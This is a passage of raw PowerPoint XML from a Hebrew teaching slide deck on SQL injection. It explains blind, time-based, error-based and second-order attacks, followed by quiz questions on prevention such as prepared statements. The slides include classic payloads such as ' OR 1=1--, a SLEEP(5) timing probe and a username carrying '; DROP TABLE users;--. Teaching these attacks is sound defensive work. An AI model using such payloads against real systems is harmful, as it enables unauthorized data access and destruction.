              <a:rPr lang="en-US" dirty="0"/>
              <a:t>' OR 1=1--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>' OR 'a'='a'--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לבדוק אם הביטוי מחזיר נכון (ולכן מראה שהתנאי מתקיים), התוקף יכול לבדוק בתגובת השרת אם המידע נמצא או לא. כך, ניתן לאט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לאט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לחשוף מידע על בסיס הנתונים, אפילו אם אין משוב ישיר מהשרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לסיכום: את הדבר הזה עושים כאשר האתר אינו מחזיר הודעות שגיאה ברורות, אך התוקף יכול לבדוק אם תנאים בשאילתה מתקיימים על פי תגובות שונות מהשרת (כמו עמוד שמופיע או נעלם). למשל, התוקף יכול להוסיף תנאי כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>' OR 1=1--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לשאילתה ולראות אם התגובה שונה ממצב בו התנאי לא מתקיים באמצעות שינוי התנאים, התוקף יכול "לנחש" את מבנה ומידע בסיס הנתונים בצורה עיוורת (בלי משוב ישיר מהשרת).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="335120244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2C0367B-0BAF-4F2A-89C1-6B64A409F6C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2037522" y="642594"/>
            <a:ext cx="9087678" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Time-Based Blind SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C87DEF65-EECC-49C3-B7C6-7ED018EFB4F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשיטה זו, התוקף משתמש בפונקציות שמאטות את תגובת השרת כדי לקבוע אם תנאי מסוים מתקיים. זוהי דרך נוספת להוציא מידע מבסיס נתונים כאשר אין משוב ישיר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח ששאילתה מאפשרת לתוקף לבדוק את השאילתה עם פונקציית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SLEEP()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>' OR IF(1=1, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>SLEEP(5)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, 0)—</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בודקת אם התנאי 1=1 (תנאי שתמיד נכון). אם התנאי נכון, מבצע המתנה של 5 שניות בעזרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SLEEP(5)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם התנאי לא נכון (במקרה הזה לא יכול להיות), מחזיר 0 ללא עיכוב. עיכוב זה מאפשר לתוקף לבדוק אם תנאים נוספים משפיעים על זמן התגובה של השרת, מה שיכול לשמש כדי לחשוף מידע על מבנה בסיס הנתונים או תוכן נוסף.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם השרת עוקב אחרי הזמן ומבצע הפסקה של 5 שניות, התוקף יודע שהתנאי מתקיים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23149972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37CB25-96D1-4AB2-A5EF-E07D8A51FEB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1202634" y="642594"/>
            <a:ext cx="9922565" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Extracting Data Using Error Messages</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95EA7FB5-5BF8-4CA8-870A-5FF3FE0DEA39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בהתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Error-Based SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף מנצל את שגיאות ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמחזיר השרת כדי לחשוף מידע רגיש על מבנה בסיס הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בנויה באופן שמחזירה שגיאות מהשרת, תוקף יכול לנסות להכניס שאילתה זדונית כדי לגרום לשגיאה שמחזירה מידע:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>1' AND 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=(SELECT COUNT(*) FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>information_schema.tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)—</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הביטוי משמש כדי לבדוק אם השאילתה מצליחה לחשוף את מספר הטבלאות בבסיס הנתונים. הוא מוסיף תנאי לשאילתה שמוודא אם מספר הטבלאות שווה ל-1. אם יש התאמה, ייתכן שהתוצאה נחשפת או לא.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שגיאה זו יכולה לחשוף כמה טבלאות קיימות בבסיס הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :SQL (SQL Injection)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הביטוי משתמש ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>AND</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להוסיף תנאים לשאילתה המקורית, מה שמאפשר לתוקף להזריק קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נוסף לשאילתה ולבצע פעולות בלתי מורשות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34254448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BD0AA3-6713-4CCC-8FBB-08754E346859}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2703442" y="642594"/>
            <a:ext cx="8421757" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Second-Order SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E6E3E633-5485-489C-9A65-C78E048BADB5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בהתקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Second-Order SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף אינו רואה את הפלט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>המיידי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מהשאילתה שהוא מזריק, אלא מזריק קוד זדוני שנשמר בבסיס הנתונים, ומופעל בשלב מאוחר יותר על ידי מערכת אחרת או אירוע אחר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף מזין שם משתמש כזה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>; DROP TABLE users;--</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מזין את הערך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'; DROP TABLE users;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לשדה שם המשתמש. הביטוי ' סוגר את הציטוט של השאילתה המקורית, והחלק </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ;DROP TABLE users;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מוסיף פקודת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> חדשה. הפעולה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;DROP TABLE users;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מביאה למחיקת הטבלה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מבסיס הנתונים. ולכן אם הנתונים נשמרים כמו שהם ומבוצעת שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נוספת עם שם המשתמש, הפקודה הזדונית תתבצע, ותגרום לנזק כמו מחיקת הטבלה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם השם נשמר כמו שהוא, במועד מאוחר יותר בעת שאילתת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחרת שמתבצעת על שם המשתמש, הפקודה הזדונית תתבצע.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="55103654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772616-76E4-4B54-81CC-71DA02136343}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9163878" y="642594"/>
            <a:ext cx="1961322"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131EAE80-70C5-4A5C-9D41-32D360D36EFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהי התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך תוקף יכול לנצל</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לקבל גישה לא מורשית למערכת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהן השיטות העיקריות להגנה מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מה ההבדל בין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Classic SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Blind SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. כיצד שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prepared Statements </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מונע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="348310960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B964923-4FB1-474A-AFD1-DBD54C8AAA75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8965096" y="642594"/>
            <a:ext cx="2160104"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9D6E6CE6-B9B0-45EF-AD55-6DE2F99D125E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא טכניקת התקפה שבה התוקף מחדיר קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני לתוך שאילתה של בסיס נתונים דרך קלט שאינו מוגן כראוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. תוקף יכול להזריק קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני לשאילתה קיימת, ולגרום לכך שתתבצע פעולה לא מורשית, כמו קבלת גישה ללא סיסמה נכונה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. השיטות העיקריות כוללות בדיקת קלט, שימוש בשאילתות פרמטריות (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Prepared Statements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש בפרוצדורות מאוחסנות, ושימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ORM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Classic SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מקבל משוב ישיר מהשרת על הצלחת ההתקפה, בעוד שב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Blind SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אין משוב ישיר, והתוקף חייב לחלץ מידע באמצעות מניפולציות מתוחכמות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prepared Statements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מפרידים בין הקוד לבין הקלט, ומוודאים שהקלט מתייחס כערכים בלבד, ולא כחלק מקוד ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="117575978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16C34BF5-6A42-41B2-8BD8-CA2C68A029C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2421172"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t> Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="7200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32057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4C36D4-EC63-4B7E-A615-94F0A7CFD4FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4492486" y="642594"/>
            <a:ext cx="6632713" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>? </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6D9F1320-37B2-4891-801D-E488E2B7AB94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1255643" y="2283486"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
